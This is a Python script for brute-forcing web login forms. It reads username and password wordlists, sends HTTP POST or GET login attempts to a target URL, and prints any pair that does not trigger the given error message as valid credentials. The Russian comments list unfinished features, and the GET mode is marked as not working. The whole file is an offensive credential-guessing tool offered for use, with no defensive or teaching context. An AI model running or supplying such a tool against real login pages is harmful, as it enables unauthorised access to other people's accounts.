import argparse
import requests
import sys
import string
import time

parser = argparse.ArgumentParser(description = "I developed this tool for bruteforcing...")
parser.add_argument('-e', '--error_message', help="Message if I used invalid credentials", required=True)
parser.add_argument('-f', '--first', help="Stop on first n values of valid credentials")
parser.add_argument('-i', '--ip', help="URL for bruteforcing", required=True, type=str)
parser.add_argument('-k', '--keys', help="Keys (for example, username,password) from source code", required=True)
parser.add_argument('-m', '--method', help="Set method gor attack", required=True)
parser.add_argument('-p', '--password', help="Password for authentication", type=str)
parser.add_argument('-P', '--passwords', help="List with passwords for attack")
parser.add_argument('-t', '--threads', help="Enter count threads for bruteforcing", default=1)
parser.add_argument('-u', '--username', help="Username for authentication", type=str)
parser.add_argument('-U', '--usernames', help="List with usernames for attack")
parser.add_argument('-v', '--verbose', help="Start verbose mode", default=False)
args = parser.parse_args()

# Добавить обработку потоков, http_get метод, ssl/tls
# Добавить обработку большего количества параметров
# Добавить подробный режим

# Набросок для по шаблонам
'''
passwords = []
for i in range(1000):
    password = str(i).zfill(3)
    for letter in string.ascii_uppercase:
        passwords.append(password + letter)
'''

def init_data():
    URL = args.ip
    method = args.method
    threads = args.threads
    keys = args.keys.split(",")
    error = args.error_message
    verbose = args.verbose
    first = args.first

    if args.username == None and args.usernames != None:
        with open(args.usernames, "r") as file:
            usernames = []
            for user in file.readlines():
                usernames.append(user.strip())
    elif args.username != None and args.usernames == None:
        usernames = [args.username]
    elif args.username != None and args.usernames != None:
        print ("[*] You want to use -u and -U options both.You need to choose: username (-u option) of file with usernames (-U option).")
        sys.exit()
    else:
        print ("[*] You need to specify -u or -U option.")
        sys.exit()

    if args.password == None and args.passwords != None:
        with open(args.passwords, "r") as file:
            passwords = []
            for passwd in file.readlines():
                passwords.append(passwd.strip())
    elif args.password != None and args.passwords == None:
        passwords = [args.password]
    elif args.password != None and args.passwords != None:
        print ("[*] You want to use -p and -P options both.You need to choose: password (-p option) of file with passwords (-P option).")
        sys.exit()
    else:
        print ("[*] You need to specify -p or -P option.")
        sys.exit()

    return URL, method, threads, keys, error, usernames, passwords, verbose, first

def http_post_brute(usernames, passwords, URL, keys, threads, error, verbose, first):
    count = 0
    for username in usernames:
        for password in passwords:
            data = {keys[0]:username, keys[1]:password}
            response = requests.post(URL, data=data)

            if error not in response.text and count < int(first):
                print (count, first)
                print (f'[+] Found valid credentials: {username}:{password}')
                count += 1
            elif count == int(first):
                sys.exit()
            else:
                print (f'[*] Attempted: {username}:{password}')
    

def http_get_brute(usernames, passwords, URL, keys, threads, error): # Не работает
    for username in usernames:
        for password in passwords:
            response = requests.get(f"{URL}/?{keys[0]}={username}&{keys[1]}={password}")
            print (response.text)
            if error not in response.text:
                print (f'[+] Found valid credentials: {username}:{password}')
                break
            else:
                print (f'[*] Attempted: {username}:{password}')


def start_scan(URL, method, threads, usernames, passwords, verbose, first):
    if args.method == 'http_post':
        http_post_brute(usernames, passwords, URL, keys, threads, error, verbose, first) 
    elif args.method == 'http_get':
        http_get_brute(usernames, passwords, URL, keys, threads, error)
    else:
        pass

if __name__ == "__main__":
    URL, method, threads, keys, error, usernames, passwords, verbose, first = init_data()
    start_scan(URL, method, threads, usernames, passwords, verbose, first)


# Дописать вербоз мод